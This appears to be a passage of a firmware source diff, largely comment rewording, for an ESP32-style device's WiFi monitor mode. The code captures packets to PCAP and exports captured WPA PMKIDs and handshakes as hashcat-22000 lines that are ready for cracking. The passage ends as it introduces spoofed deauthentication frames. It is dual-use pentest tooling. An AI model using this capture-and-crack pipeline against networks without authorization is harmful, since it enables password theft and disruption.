@@ -2231,15 +2334,15 @@ static void do_monitor_on(void)
     if (!bring_up()) {
         return;
     }
-    if (s_ap_active) { ap_teardown(); }               /* single radio: capture ends the AP */
-    s_enabled = true;                                 /* capture powers the radio */
+    if (s_ap_active) { ap_teardown(); }               /* with only one radio, capture ends the AP */
+    s_enabled = true;                                 /* capture powers the radio on */
     if (!ensure_started()) {
         return;
     }
     if (s_sta_started) {
         enter_promiscuous();
     } else {
-        s_pending_monitor = true;                     /* STA_START will enter */
+        s_pending_monitor = true;                     /* STA_START will enter it */
         refresh_strings();
     }
 }
@@ -2251,7 +2354,7 @@ static void do_monitor_off(void)
     }
     bool was_active = s_mon_active;
     monitor_teardown();
-    if (was_active && s_mon_prev_connected && s_ssid[0]) {   /* restore the link we suspended */
+    if (was_active && s_mon_prev_connected && s_ssid[0]) {   /* restores the link that was suspended */
         s_want_connect = true;
         s_retry = 0;
         s_auth_fail = false;
@@ -2272,7 +2375,7 @@ static void do_mon_chan(int ch)
 {
     if (ch < 1)  ch = 1;
     if (ch > 13) ch = 13;
-    s_mon_hop = false;                                /* picking a channel implies lock */
+    s_mon_hop = false;                                /* picking a channel implies locking to it */
     s_mon_chan = ch;
     if (s_mon_active) {
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
@@ -2280,9 +2383,11 @@ static void do_mon_chan(int ch)
     refresh_strings();
 }
 
-/* Turn the passive parser on: ensure capture is running (it drops any STA link), lazily allocate
- * the PSRAM copy-out ring, clear the AP table, spin up the drain task once, then arm the rx-cb
- * copy-out. Idempotent while already parsing (so we never reset the ring under the live producer). */
+/* Turns the passive parser on: makes sure capture is running (which
+ * drops any STA link), lazily allocates the PSRAM copy-out ring, clears the
+ * AP table, spins up the drain task once, then arms the rx callback's
+ * copy-out. Idempotent while already parsing, so the ring is never reset
+ * out from under the live producer. */
 static void do_parse_on(void)
 {
     if (s_parse_active) {
@@ -2291,10 +2396,10 @@ static void do_parse_on(void)
     if (nocsif_reliability_safe_mode()) {
         return;
     }
-    if (!s_mon_active && !s_pending_monitor) {         /* capture is the source — start it */
+    if (!s_mon_active && !s_pending_monitor) {         /* capture is the source of frames: start it */
         do_monitor_on();
     }
-    if (!s_mon_active && !s_pending_monitor) {         /* capture failed to come up — don't arm */
+    if (!s_mon_active && !s_pending_monitor) {         /* capture failed to come up: don't arm the parser */
         ESP_LOGW(TAG, "parser: capture did not start; not arming");
         return;
     }
@@ -2306,7 +2411,7 @@ static void do_parse_on(void)
             return;
         }
     }
-    s_ring_head = s_ring_tail = s_ring_drop = 0;       /* safe: producer skips while s_parse_active=0 */
+    s_ring_head = s_ring_tail = s_ring_drop = 0;       /* safe: the producer skips work while s_parse_active is 0 */
 
     portENTER_CRITICAL(&s_ap_mux);
     for (int i = 0; i < MON_AP_MAX; i++)    s_mon_ap[i].used    = false;
@@ -2318,13 +2423,17 @@ static void do_parse_on(void)
     portEXIT_CRITICAL(&s_ap_mux);
 
     if (s_parse_task == NULL) {
-        /* RAM Phase A3: the four LAZY WiFi workers (parser / PCAP writer / handshake export / portal DNS)
-         * get PSRAM stacks. They are exactly the transient internal claims that eroded the contiguous
-         * int-DMA run under Signal Hunt / capture (measured −9 KB in LoRa-hunt mode after A2), and each is
-         * cache-off-safe: the parser reads the PSRAM ring into BSS tables, the writers stream to SD over
-         * SPI (a PSRAM-resident write buffer is bounced by sdspi's own internal block buffer), the DNS
-         * task only touches LWIP sockets — none writes NVS / internal flash on-task (the pinned `wifi`
-         * command worker owns every NVS write in this file). Deleted workers use vTaskDeleteWithCaps. */
+        /* RAM Phase A3: the four lazy WiFi workers (parser, PCAP writer,
+         * handshake export, portal DNS) get PSRAM stacks. These are exactly the
+         * transient internal claims that eroded the contiguous internal-DMA run
+         * during Signal Hunt / capture (measured -9 KB in LoRa-hunt mode after
+         * A2), and each is safe with the flash cache off: the parser reads the
+         * PSRAM ring into BSS tables, the writers stream to SD over SPI (a
+         * PSRAM-resident write buffer is bounced by sdspi's own internal block
+         * buffer), and the DNS task only touches LWIP sockets — none of them
+         * write NVS or internal flash from their own task (the pinned "wifi"
+         * command worker owns every NVS write in this file). Deleted workers
+         * use vTaskDeleteWithCaps. */
         if (xTaskCreateWithCaps(wifi_parse_task, "wifiparse", 3072, NULL, 3, &s_parse_task, MALLOC_CAP_SPIRAM) != pdPASS) {
             ESP_LOGE(TAG, "parser: task create failed");
             return;
@@ -2345,27 +2454,29 @@ static void do_parse_off(void)
              s_mon_ap_cnt, (unsigned)s_ring_drop);
 }
 
-/* ---- PCAP capture to /sd (M5-P3·3) ------------------------------------------------- *
- * A dedicated writer task owns the FILE*: it drains the all-frames ring and appends each frame
- * with a radiotap header. FAT I/O demands a large stack (the lean parser task's 3072 B overflows
- * inside fopen/fwrite — the reason this runs on its own 8 KB task). */
+/* ---- PCAP capture to /sd (M5-P3.3) ---- *
+ * A dedicated writer task owns the FILE*: it drains the all-frames ring and
+ * appends each frame with a radiotap header. FAT I/O demands a large stack
+ * — the lean parser task's 3072 B overflows inside fopen/fwrite, which is
+ * exactly why this runs on its own 8 KB task. */
 
-/* Our fixed 13-byte radiotap header: present = Channel(bit3) + dBm Antenna Signal(bit5). */
+/* Our fixed 13-byte radiotap header: present flags are Channel (bit 3) plus dBm Antenna Signal (bit 5). */
 static void pcap_build_radiotap(uint8_t rt[PCAP_RADIOTAP_LEN], uint8_t channel, int8_t rssi)
 {
     int c = (channel >= 1 && channel <= 14) ? channel : 1;
     uint16_t freq = (c == 14) ? 2484 : (uint16_t)(2412 + (c - 1) * 5);
-    rt[0] = 0; rt[1] = 0;                              /* it_version, it_pad            */
-    rt[2] = PCAP_RADIOTAP_LEN; rt[3] = 0;              /* it_len (LE)                   */
-    rt[4] = 0x28; rt[5] = 0; rt[6] = 0; rt[7] = 0;     /* it_present: Channel + dBm sig */
-    rt[8]  = (uint8_t)(freq & 0xFF);                   /* channel frequency (LE)        */
+    rt[0] = 0; rt[1] = 0;                              /* it_version, it_pad */
+    rt[2] = PCAP_RADIOTAP_LEN; rt[3] = 0;              /* it_len, little-endian */
+    rt[4] = 0x28; rt[5] = 0; rt[6] = 0; rt[7] = 0;     /* it_present: Channel plus dBm signal */
+    rt[8]  = (uint8_t)(freq & 0xFF);                   /* channel frequency, little-endian */
     rt[9]  = (uint8_t)(freq >> 8);
-    rt[10] = 0x80; rt[11] = 0x00;                      /* channel flags: 2 GHz          */
-    rt[12] = (uint8_t)rssi;                            /* dBm antenna signal (int8)     */
+    rt[10] = 0x80; rt[11] = 0x00;                      /* channel flags: 2GHz */
+    rt[12] = (uint8_t)rssi;                            /* dBm antenna signal, as an int8 */
 }
 
-/* Choose the next free capture file. Assumes the /sd lock is held. The prefix reflects the active
- * filter: cap-NNN (full capture) vs hs-NNN (EAPOL key-exchange session). */
+/* Chooses the next free capture file. Assumes the /sd lock is already
+ * held. The filename prefix reflects the active filter: cap-NNN for a full
+ * capture, hs-NNN for an EAPOL key-exchange session. */
 static void pcap_pick_path(char *out, size_t outlen)
 {
     const char *pfx = (s_pcap_filter == PCAP_FILTER_EAPOL) ? "hs" : "cap";
@@ -2373,14 +2484,16 @@ static void pcap_pick_path(char *out, size_t outlen)
         snprintf(out, outlen, "/sd/nocsif/wifi/%s-%03d.pcap", pfx, i);
         struct stat st;
         if (stat(out, &st) != 0) {
-            return;                                    /* first non-existent name */
+            return;                                    /* the first name that doesn't already exist */
         }
     }
-    snprintf(out, outlen, "/sd/nocsif/wifi/%s-999.pcap", pfx);   /* fallback: reuse the last */
+    snprintf(out, outlen, "/sd/nocsif/wifi/%s-999.pcap", pfx);   /* fallback: just reuse the last one */
 }
 
-/* Open the capture file: own the card, create the output dirs, write the PCAP global header.
- * Returns the FILE* with s_pcap_path + counters set, or NULL with s_pcap_state on failure. */
+/* Opens the capture file: claims the card, creates the output
+ * directories, and writes the PCAP global header. Returns the FILE* with
+ * s_pcap_path and the counters set, or NULL with s_pcap_state describing
+ * the failure. */
 static FILE *pcap_open_file(void)
 {
     esp_err_t ce = nocsif_usb_gadget_claim_sd(2000);
@@ -2405,12 +2518,12 @@ static FILE *pcap_open_file(void)
         s_pcap_path[0] = '\0';
         return NULL;
     }
-    /* PCAP global header (LE): magic a1b2c3d4 · v2.4 · zone 0 · sig 0 · snaplen · LINKTYPE=127. */
+    /* PCAP global header, little-endian: magic a1b2c3d4, v2.4, zone 0, sig 0, snaplen, LINKTYPE=127. */
     uint8_t gh[24];
     uint32_t magic = 0xa1b2c3d4u, snaplen = PCAP_SNAP + PCAP_RADIOTAP_LEN, net = 127;
     memcpy(gh + 0, &magic, 4);
     gh[4] = 2; gh[5] = 0; gh[6] = 4; gh[7] = 0;        /* version_major 2, version_minor 4 */
-    memset(gh + 8, 0, 8);                              /* thiszone + sigfigs */
+    memset(gh + 8, 0, 8);                              /* thiszone plus sigfigs */
     memcpy(gh + 16, &snaplen, 4);
     memcpy(gh + 20, &net, 4);
     fwrite(gh, 1, sizeof gh, f);
@@ -2424,7 +2537,7 @@ static FILE *pcap_open_file(void)
     return f;
 }
 
-/* Append one frame record (record header + radiotap + captured bytes). Assumes the lock is held. */
+/* Appends one frame record: record header, radiotap header, then captured bytes. Assumes the lock is already held. */
 static void pcap_write_record(FILE *f, const pcap_slot_t *s)
 {
     uint8_t rt[PCAP_RADIOTAP_LEN];
@@ -2448,15 +2561,18 @@ static void pcap_write_record(FILE *f, const pcap_slot_t *s)
     s_pcap_frames++;
 }
 
-/* ---- CDC live-stream sink (M5-P5+) ------------------------------------------------------- *
- * The same PCAP byte layout as the SD file (a global header once, then radiotap + record per frame)
- * but pushed to the host over USB-CDC instead of written to /sd. A host tool (Wireshark via the
- * bundled extcap) opens the port and reads a live capture. No /sd lock, no FILE* — just the CDC TX
- * ring. Bytes accepted by cdc_write are committed to the wire, so a record is always sent whole. */
+/* ---- CDC live-stream sink (M5-P5+) ---- *
+ * The same PCAP byte layout as the SD file — one global header, then a
+ * radiotap header and record per frame — but pushed to the host over
+ * USB-CDC instead of written to /sd. A host tool (Wireshark, via the
+ * bundled extcap) opens the port and reads a live capture. No /sd lock and
+ * no FILE* involved — just the CDC TX ring. Bytes accepted by cdc_write are
+ * already committed to the wire, so a record is always sent whole. */
 
-/* Send the whole buffer over CDC, looping past FIFO-full with bounded flushes. A total stall (the
- * host stopped reading) returns false; the caller then re-emits a fresh global header on reconnect
- * so the stream re-frames cleanly. */
+/* Sends the whole buffer over CDC, looping past a full FIFO with
+ * bounded flushes. A total stall — the host stopped reading — returns
+ * false; the caller then re-emits a fresh global header on reconnect so the
+ * stream re-frames cleanly. */
 static bool pcap_cdc_send_all(const uint8_t *buf, size_t len)
 {
     size_t off = 0;
@@ -2467,7 +2583,7 @@ static bool pcap_cdc_send_all(const uint8_t *buf, size_t len)
         if (off < len) {
             nocsif_usb_gadget_cdc_flush(20);
             if (n == 0) {
-                if (++stalls > 12) return false;       /* ~250 ms of no progress: host gone */
+                if (++stalls > 12) return false;       /* roughly 250ms of no progress means the host is gone */
             } else {
                 stalls = 0;
             }
@@ -2476,14 +2592,14 @@ static bool pcap_cdc_send_all(const uint8_t *buf, size_t len)
     return true;
 }
 
-/* Emit the PCAP global header to CDC (once per stream session). Mirrors pcap_open_file's header. */
+/* Emits the PCAP global header to CDC, once per stream session. Mirrors pcap_open_file's own header. */
 static bool pcap_cdc_header(void)
 {
     uint8_t gh[24];
     uint32_t magic = 0xa1b2c3d4u, snaplen = PCAP_SNAP + PCAP_RADIOTAP_LEN, net = 127;
     memcpy(gh + 0, &magic, 4);
     gh[4] = 2; gh[5] = 0; gh[6] = 4; gh[7] = 0;        /* version_major 2, version_minor 4 */
-    memset(gh + 8, 0, 8);                              /* thiszone + sigfigs */
+    memset(gh + 8, 0, 8);                              /* thiszone plus sigfigs */
     memcpy(gh + 16, &snaplen, 4);
     memcpy(gh + 20, &net, 4);
     if (!pcap_cdc_send_all(gh, sizeof gh)) {
@@ -2494,8 +2610,7 @@ static bool pcap_cdc_header(void)
     return true;
 }
 
-/* Push one frame record (record header + radiotap + captured bytes) to CDC, built contiguously so
- * it is never split mid-flight. Returns false on a host stall (the stream must restart). */
+/* Pushes one frame record — record header, radiotap header, captured bytes — to CDC, built contiguously so it's never split mid-flight. Returns false on a host stall, meaning the stream must restart. */
 static bool pcap_cdc_record(const pcap_slot_t *s)
 {
     uint8_t  rec[16 + PCAP_RADIOTAP_LEN + PCAP_SNAP];
@@ -2519,24 +2634,26 @@ static bool pcap_cdc_record(const pcap_slot_t *s)
     return true;
 }
 
-/* Single consumer of the PCAP ring; owns the whole sink lifecycle. The sink is chosen by
- * s_pcap_sink before arming: SD writes a file (open on request, drain under the /sd lock, close on
- * stop); CDC streams to the host serial port (wait for a host, emit the header, drain to CDC). */
+/* The single consumer of the PCAP ring, owning the whole sink's
+ * lifecycle. The sink is chosen by s_pcap_sink before arming: SD writes a
+ * file (opened on request, drained under the /sd lock, closed on stop); CDC
+ * streams to the host's serial port (waits for a host, emits the header,
+ * then drains to CDC). */
 static void pcap_writer_task(void *arg)
 {
     (void)arg;
-    FILE *f = NULL;             /* SD sink FILE* (NULL when streaming to CDC)   */
-    bool  cdc_open = false;     /* CDC sink: global header sent, streaming live */
+    FILE *f = NULL;             /* the SD sink's FILE*, NULL while streaming to CDC instead */
+    bool  cdc_open = false;     /* the CDC sink: whether the global header has been sent, and streaming is live */
     for (;;) {
-        if (!s_pcap_want) {                            /* stop requested — tear down whichever sink */
-            if (f) {                                   /* SD: flush + close */
+        if (!s_pcap_want) {                            /* a stop was requested: tear down whichever sink is active */
+            if (f) {                                   /* SD: flush and close */
                 if (nocsif_sdcard_lock(2000)) { fflush(f); fclose(f); nocsif_sdcard_unlock(); }
                 else                          { fclose(f); }
                 f = NULL;
                 ESP_LOGI(TAG, "pcap: closed (%u frames, %u bytes, %u dropped)",
                          (unsigned)s_pcap_frames, (unsigned)s_pcap_bytes, (unsigned)s_pcap_drop);
             }
-            if (cdc_open) {                            /* CDC: flush what is queued */
+            if (cdc_open) {                            /* CDC: flush whatever's queued */
                 nocsif_usb_gadget_cdc_flush(50);
                 cdc_open = false;
                 ESP_LOGI(TAG, "pcap: stream stopped (%u frames, %u bytes, %u dropped)",
@@ -2546,43 +2663,43 @@ static void pcap_writer_task(void *arg)
             if (s_pcap_state == PCAP_REC || s_pcap_state == PCAP_STREAM || s_pcap_state == PCAP_NOHOST) {
                 s_pcap_state = PCAP_OFF;
             }
-            s_pcap_idle = true;                        /* parked: pcap_stop_and_free may now delete us */
+            s_pcap_idle = true;                        /* parked: pcap_stop_and_free may now delete this task */
             vTaskDelay(pdMS_TO_TICKS(100));
             continue;
         }
-        s_pcap_idle = false;                           /* actively capturing — not safe to delete */
+        s_pcap_idle = false;                           /* actively capturing: not safe to delete yet */
 
         if (s_pcap_sink == PCAP_SINK_CDC) {
             /* ---- CDC live stream (M5-P5+) ---- */
             bool ready = nocsif_usb_gadget_cdc_ready();
-            if (cdc_open && !ready) {                   /* host went away (even while idle) — the next
+            if (cdc_open && !ready) {                   /* the host went away, even while idle; the next
                                                         * host must get a fresh global header */
                 cdc_open = false;
                 s_pcap_active = false;
                 s_pcap_state  = PCAP_NOHOST;
             }
             if (!cdc_open) {
-                if (!ready) {                          /* CDC not enumerated / no host reading yet */
+                if (!ready) {                          /* CDC isn't enumerated, or no host is reading yet */
                     s_pcap_state  = PCAP_NOHOST;
-                    s_pcap_active = false;             /* don't fill the ring until a host is present */
+                    s_pcap_active = false;             /* don't fill the ring until a host is actually present */
                     vTaskDelay(pdMS_TO_TICKS(200));
                     continue;
                 }
-                if (!pcap_cdc_header()) {              /* host vanished mid-header — retry */
+                if (!pcap_cdc_header()) {              /* the host vanished mid-header: retry */
                     vTaskDelay(pdMS_TO_TICKS(200));
                     continue;
                 }
-                s_pcap_head = s_pcap_tail = s_pcap_drop = 0;   /* fresh ring for this session */
+                s_pcap_head = s_pcap_tail = s_pcap_drop = 0;   /* a fresh ring for this session */
                 s_pcap_frames = 0;
-                s_pcap_active = true;                  /* now the rx cb fills the ring */
+                s_pcap_active = true;                  /* now the rx callback fills the ring */
                 s_pcap_state  = PCAP_STREAM;
                 cdc_open = true;
             }
-            uint32_t head = s_pcap_head;               /* sole consumer */
+            uint32_t head = s_pcap_head;               /* the sole consumer */
             uint32_t tail = __atomic_load_n(&s_pcap_tail, __ATOMIC_ACQUIRE);
             if (head == tail) {
                 nocsif_usb_gadget_cdc_flush(10);
-                vTaskDelay(pdMS_TO_TICKS(15));         /* idle poll */
+                vTaskDelay(pdMS_TO_TICKS(15));         /* an idle poll */
                 continue;
             }
             int  budget = 24;
@@ -2593,7 +2710,7 @@ static void pcap_writer_task(void *arg)
             }
             __atomic_store_n(&s_pcap_head, head, __ATOMIC_RELEASE);
             nocsif_usb_gadget_cdc_flush(20);
-            if (!ok) {                                 /* host stalled — restart cleanly on reconnect */
+            if (!ok) {                                 /* the host stalled: restart cleanly on reconnect */
                 cdc_open = false;
                 s_pcap_active = false;
                 s_pcap_state  = PCAP_NOHOST;
@@ -2601,26 +2718,26 @@ static void pcap_writer_task(void *arg)
             continue;
         }
 
-        /* ---- SD file (P3·3, unchanged) ---- */
-        if (f == NULL) {                               /* start requested: open the file */
+        /* ---- SD file (P3.3, unchanged) ---- */
+        if (f == NULL) {                               /* a start was requested: open the file */
             f = pcap_open_file();
-            if (f == NULL) {                           /* open failed — give up this session */
+            if (f == NULL) {                           /* open failed: give up on this session */
                 s_pcap_want = false;
                 s_pcap_active = false;
                 vTaskDelay(pdMS_TO_TICKS(100));
                 continue;
             }
-            s_pcap_head = s_pcap_tail = s_pcap_drop = 0;   /* fresh ring (producer idle until active) */
-            s_pcap_active = true;                       /* now the rx cb fills the ring */
+            s_pcap_head = s_pcap_tail = s_pcap_drop = 0;   /* a fresh ring; the producer stays idle until it's active */
+            s_pcap_active = true;                       /* now the rx callback fills the ring */
         }
 
-        uint32_t head = s_pcap_head;                    /* sole consumer */
+        uint32_t head = s_pcap_head;                    /* the sole consumer */
         uint32_t tail = __atomic_load_n(&s_pcap_tail, __ATOMIC_ACQUIRE);
         if (head == tail) {
-            vTaskDelay(pdMS_TO_TICKS(50));              /* idle poll */
+            vTaskDelay(pdMS_TO_TICKS(50));              /* an idle poll */
             continue;
         }
-        /* Drain in bounded batches so the /sd lock is never held for a full-ring burst. */
+        /* Drains in bounded batches, so the /sd lock is never held through a full-ring burst. */
         if (nocsif_sdcard_lock(1000)) {
             int budget = 24;
             while (head != tail && budget-- > 0) {
@@ -2631,15 +2748,17 @@ static void pcap_writer_task(void *arg)
             nocsif_sdcard_unlock();
             __atomic_store_n(&s_pcap_head, head, __ATOMIC_RELEASE);
         } else {
-            vTaskDelay(pdMS_TO_TICKS(20));              /* lock busy — retry shortly */
+            vTaskDelay(pdMS_TO_TICKS(20));              /* the lock is busy: retry shortly */
         }
     }
 }
 
-/* Allocate the PCAP ring (lazy, PSRAM) + spawn the big-stack writer task, then arm it. Shared by the
- * SD recorder and the CDC live stream (the caller picks s_pcap_sink first). Returns false on an
- * allocation / task-create failure (state left at PCAP_ERR). The 6144 stack matches the ducky FATFS
- * reader; the task exists only while a session is armed and is freed on stop (pcap_stop_and_free). */
+/* Allocates the PCAP ring lazily in PSRAM, spawns the big-stack writer
+ * task, then arms it. Shared by both the SD recorder and the CDC live
+ * stream — the caller picks s_pcap_sink first. Returns false on an
+ * allocation or task-create failure, leaving the state at PCAP_ERR. The
+ * 6144-byte stack matches the ducky FATFS reader's; the task only exists
+ * while a session is armed, and is freed on stop by pcap_stop_and_free. */
 static bool pcap_arm_writer(void)
 {
     if (s_pcap_ring == NULL) {
@@ -2661,7 +2780,7 @@ static bool pcap_arm_writer(void)
             return false;
         }
     }
-    s_pcap_want = true;                                 /* the writer opens the sink + arms the copy-out */
+    s_pcap_want = true;                                 /* the writer opens the sink and arms the copy-out */
     return true;
 }
 
@@ -2673,7 +2792,7 @@ static void do_pcap_on(void)
     if (nocsif_reliability_safe_mode()) {
         return;
     }
-    if (!s_mon_active && !s_pending_monitor) {          /* capture is the source — start it */
+    if (!s_mon_active && !s_pending_monitor) {          /* capture is the frame source: start it */
         do_monitor_on();
     }
     if (!s_mon_active && !s_pending_monitor) {
@@ -2685,11 +2804,14 @@ static void do_pcap_on(void)
     pcap_arm_writer();
 }
 
-/* Live-PCAP over USB-CDC (M5-P5+): stream captured frames to the host serial port for real-time
- * Wireshark (via the bundled extcap) instead of writing a file. Auto-requests CDC gadget mode (the
- * transport) and starts monitor (the source); the writer then waits for a host to open the port
- * (DTR) before emitting the PCAP stream. Shares the single ring/writer — refused while any capture
- * session is active. Runs on the wifi worker (serialised with do_pcap_*). */
+/* Live-PCAP over USB-CDC (M5-P5+): streams captured frames to the host
+ * serial port for real-time Wireshark viewing (via the bundled extcap)
+ * instead of writing a file. Auto-requests CDC gadget mode as the transport
+ * and starts monitor mode as the source; the writer then waits for a host
+ * to open the port (DTR) before actually emitting the PCAP stream. Shares
+ * the single ring/writer with the file recorder, so it's refused while any
+ * capture session is already active. Runs on the wifi worker, serialized
+ * with do_pcap_*. */
 static void do_pcap_stream_on(void)
 {
     if (s_pcap_want) {
@@ -2699,7 +2821,7 @@ static void do_pcap_stream_on(void)
     if (nocsif_reliability_safe_mode()) {
         return;
     }
-    if (!s_mon_active && !s_pending_monitor) {          /* capture is the source — start it */
+    if (!s_mon_active && !s_pending_monitor) {          /* capture is the frame source: start it */
         do_monitor_on();
     }
     if (!s_mon_active && !s_pending_monitor) {
@@ -2707,28 +2829,29 @@ static void do_pcap_stream_on(void)
         s_pcap_state = PCAP_ERR;
         return;
     }
-    nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_CDC); /* transport — enumerate CDC to the host */
+    nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_CDC); /* the transport: enumerate CDC to the host */
     s_pcap_sink   = PCAP_SINK_CDC;
     s_pcap_filter = PCAP_FILTER_FULL;
-    s_pcap_state  = PCAP_NOHOST;                         /* until a host opens the port */
+    s_pcap_state  = PCAP_NOHOST;                         /* wait until a host opens the port */
     if (!pcap_arm_writer()) {
-        s_pcap_sink = PCAP_SINK_SD;                      /* arm failed — restore the default sink */
+        s_pcap_sink = PCAP_SINK_SD;                      /* arming failed: restore the default sink */
     }
 }
 
-/* Stop recording and RECLAIM the writer task's internal-RAM stack. Runs on the wifi worker (which
- * also runs do_pcap_on), so the create/delete lifecycle is serialised — no race with a restart.
- * Waits (bounded) for the writer to close the file + park before deleting it, so we never delete a
- * task mid-fwrite or while it holds the /sd lock. */
+/* Stops recording and reclaims the writer task's internal-RAM stack.
+ * Runs on the wifi worker, which also runs do_pcap_on, so the create/delete
+ * lifecycle is serialized and there's no race with a restart. Waits, with a
+ * bound, for the writer to close its file and park before deleting it, so a
+ * task is never deleted mid-fwrite or while it holds the /sd lock. */
 static void pcap_stop_and_free(void)
 {
-    s_pcap_want   = false;                              /* writer flushes + closes, then parks */
-    s_pcap_active = false;                              /* producer (rx cb) stops immediately  */
+    s_pcap_want   = false;                              /* the writer flushes and closes, then parks */
+    s_pcap_active = false;                              /* the producer (rx callback) stops immediately */
     if (s_pcap_task) {
-        for (int i = 0; i < 80 && !s_pcap_idle; i++) {  /* up to ~2 s for the file to close + park */
+        for (int i = 0; i < 80 && !s_pcap_idle; i++) {  /* up to roughly 2s for the file to close and park */
             vTaskDelay(pdMS_TO_TICKS(25));
         }
-        vTaskDeleteWithCaps(s_pcap_task);               /* paired with xTaskCreateWithCaps: frees the PSRAM stack + TCB */
+        vTaskDeleteWithCaps(s_pcap_task);               /* pairs with xTaskCreateWithCaps: frees the PSRAM stack and TCB */
         s_pcap_task = NULL;
     }
     if (s_pcap_state == PCAP_REC || s_pcap_state == PCAP_STREAM || s_pcap_state == PCAP_NOHOST) {
@@ -2739,7 +2862,7 @@ static void pcap_stop_and_free(void)
 static void do_pcap_stream_off(void)
 {
     pcap_stop_and_free();
-    s_pcap_sink = PCAP_SINK_SD;                          /* restore the file sink for the next Record */
+    s_pcap_sink = PCAP_SINK_SD;                          /* restores the file sink, ready for the next Record */
 }
 
 static void do_pcap_off(void)
@@ -2747,9 +2870,11 @@ static void do_pcap_off(void)
     pcap_stop_and_free();
 }
 
-/* Arm the shared PCAP writer in EAPOL-filter mode (M5-P4·1) — records the key exchange + naming
- * frames to hs-NNN.pcap. Refused if the writer is already recording (one file at a time); the full
- * and EAPOL sessions share one ring + task. Runs on the wifi worker (serialised with do_pcap_*). */
+/* Arms the shared PCAP writer in EAPOL-filter mode (M5-P4.1), recording
+ * the key exchange and naming frames to hs-NNN.pcap. Refused if the writer
+ * is already recording, since only one file can be active at a time — the
+ * full and EAPOL sessions share one ring and task. Runs on the wifi worker,
+ * serialized with do_pcap_*. */
 static void do_hs_capture_on(void)
 {
     if (s_pcap_want) {                                  /* a session is already recording */
@@ -2758,23 +2883,25 @@ static void do_hs_capture_on(void)
     }
     s_pcap_filter = PCAP_FILTER_EAPOL;
     do_pcap_on();
-    if (!s_pcap_want) {                                 /* start failed — restore the default filter */
+    if (!s_pcap_want) {                                 /* start failed: restore the default filter */
         s_pcap_filter = PCAP_FILTER_FULL;
     }
 }
 
-/* ---- hc22000 export (M5 passive polish) -------------------------------------------- *
- * Turn the captured PMKIDs + 4-way handshakes into a hashcat-22000 file on /sd, so a capture is
- * crackable without the PC-side hcxpcapngtool step. One-shot: a dedicated big-stack task snapshots
- * the key-exchange table (per-entry, under the lock), writes WPA*01 (PMKID) and WPA*02 (handshake)
- * lines, then self-deletes. Reuses the app-owned-/sd claim + lock discipline of the PCAP writer. */
+/* ---- hc22000 export (M5 passive polish) ---- *
+ * Turns the captured PMKIDs and 4-way handshakes into a hashcat-22000 file
+ * on /sd, so a capture is crackable without the usual PC-side
+ * hcxpcapngtool step. A one-shot dedicated big-stack task snapshots the
+ * key-exchange table (per-entry, under the lock), writes WPA*01 (PMKID) and
+ * WPA*02 (handshake) lines, then self-deletes. Reuses the same app-owned-/sd
+ * claim and lock discipline as the PCAP writer. */
 typedef enum { HC_IDLE = 0, HC_BUSY, HC_DONE, HC_NOSD, HC_FILESHARE, HC_ERR } hc_state_t;
 static volatile int  s_hc_state = HC_IDLE;
 static volatile int  s_hc_lines;
 static volatile bool s_hc_running;
 static char          s_hc_path[64];
 
-/* Append n bytes of `src` as lowercase hex to dst (bounded by cap); returns chars written. */
+/* Appends n bytes of `src` as lowercase hex into dst, bounded by cap; returns the number of characters written. */
 static int hexcat(char *dst, int cap, const uint8_t *src, int n)
 {
     static const char h[] = "0123456789abcdef";
@@ -2823,7 +2950,7 @@ static void hc_export_task(void *arg)
         ok = (i < s_mon_hs_cnt && s_mon_hs[i].used);
         if (ok) {
             e = s_mon_hs[i];
-            for (int j = 0; j < s_mon_ap_cnt; j++) {   /* resolve the ESSID from the AP table */
+            for (int j = 0; j < s_mon_ap_cnt; j++) {   /* resolves the ESSID from the AP table */
                 if (s_mon_ap[j].used && memcmp(s_mon_ap[j].bssid, e.bssid, 6) == 0) {
                     memcpy(ssid, s_mon_ap[j].ssid, sizeof ssid);
                     break;
@@ -2837,7 +2964,7 @@ static void hc_export_task(void *arg)
         int slen = (int)strlen(ssid);
 
         char line[600];
-        if (e.has_pmkid) {                             /* WPA*01*pmkid*apmac*stamac*essid*** */
+        if (e.has_pmkid) {                             /* the format WPA*01*pmkid*apmac*stamac*essid*** */
             int p = 0;
             p += snprintf(line + p, sizeof line - p, "WPA*01*");
             p += hexcat(line + p, sizeof line - p, e.pmkid, 16); p += snprintf(line + p, sizeof line - p, "*");
@@ -2847,7 +2974,7 @@ static void hc_export_task(void *arg)
             p += snprintf(line + p, sizeof line - p, "***\n");
             fwrite(line, 1, p, f); lines++;
         }
-        if (e.have_anonce && e.have_mic && e.eapol_len > 0) {   /* WPA*02*mic*ap*sta*essid*anonce*eapol*mp */
+        if (e.have_anonce && e.have_mic && e.eapol_len > 0) {   /* the format WPA*02*mic*ap*sta*essid*anonce*eapol*mp */
             int p = 0;
             p += snprintf(line + p, sizeof line - p, "WPA*02*");
             p += hexcat(line + p, sizeof line - p, e.mic, 16);    p += snprintf(line + p, sizeof line - p, "*");
@@ -2856,7 +2983,7 @@ static void hc_export_task(void *arg)
             p += hexcat(line + p, sizeof line - p, (const uint8_t *)ssid, slen); p += snprintf(line + p, sizeof line - p, "*");
             p += hexcat(line + p, sizeof line - p, e.anonce, 32); p += snprintf(line + p, sizeof line - p, "*");
             p += hexcat(line + p, sizeof line - p, e.eapol, e.eapol_len);        p += snprintf(line + p, sizeof line - p, "*");
-            p += snprintf(line + p, sizeof line - p, "00\n");     /* messagepair: M1+M2 (challenge from M1, EAPOL from M2) */
+            p += snprintf(line + p, sizeof line - p, "00\n");     /* messagepair: M1+M2, the challenge from M1, the EAPOL from M2 */
             fwrite(line, 1, p, f); lines++;
         }
     }
@@ -2864,7 +2991,7 @@ static void hc_export_task(void *arg)
     fflush(f); fclose(f);
     nocsif_sdcard_unlock();
     s_hc_lines = lines;
-    s_hc_state = (lines > 0) ? HC_DONE : HC_IDLE;      /* nothing to export -> back to idle */
+    s_hc_state = (lines > 0) ? HC_DONE : HC_IDLE;      /* nothing to export: go back to idle */
     s_hc_running = false;
     ESP_LOGI(TAG, "hc22000: wrote %d line(s) -> %s", lines, s_hc_path);
     vTaskDeleteWithCaps(NULL);
@@ -2888,46 +3015,51 @@ static void do_export_hc(void)
     }
 }
 
-/* ---- management-frame TX (M5-P5·1, active — authorized testing) --------------------- *
- * The FIRST active WiFi op: transmit spoofed-source deauthentication / disassociation frames to
- * solicit a reconnect (which feeds the P4·1 handshake capture) or to exercise the P4·2 detectors,
